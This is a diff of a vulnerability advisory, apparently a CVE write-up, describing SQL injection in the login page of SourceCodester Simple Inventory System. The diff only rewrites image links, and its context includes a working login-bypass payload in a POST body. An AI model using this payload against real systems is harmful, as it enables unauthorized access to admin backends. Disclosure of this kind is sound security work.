@@ -12,7 +12,7 @@ injection parameter:$_POST['username']
 
 As shown in the figure below, in login.php, after the username parameter is passed in through post, it is directly spliced into the SQL query statement without any security filtering, thus leading to the occurrence of SQL injection vulnerabilities. We can inject query statements through universal passwords to log in to the backend without the need for an admin password.
 
-![image-20240517155805194](SourceCodester Simple Inventory System Sql Inject-1.assets/image-20240517155805194.png)
+![image-20240517155805194](https://github.com/rockersiyuan/CVE/blob/main/SourceCodester Simple Inventory System Sql Inject-1.assets/image-20240517155805194.png)
 
 #### 2.Vulnerability verification and exploit
 
@@ -37,6 +37,6 @@ Connection: close
 username=admin'or%201#&password=1&submit=Login
 ```
 
-![image-20240517160321056](SourceCodester Simple Inventory System Sql Inject-1.assets/image-20240517160321056.png)
+![image-20240517160321056](https://github.com/rockersiyuan/CVE/blob/main/SourceCodester Simple Inventory System Sql Inject-1.assets/image-20240517160321056.png)
 
 It is possible to enter the background without the correct password of admin.
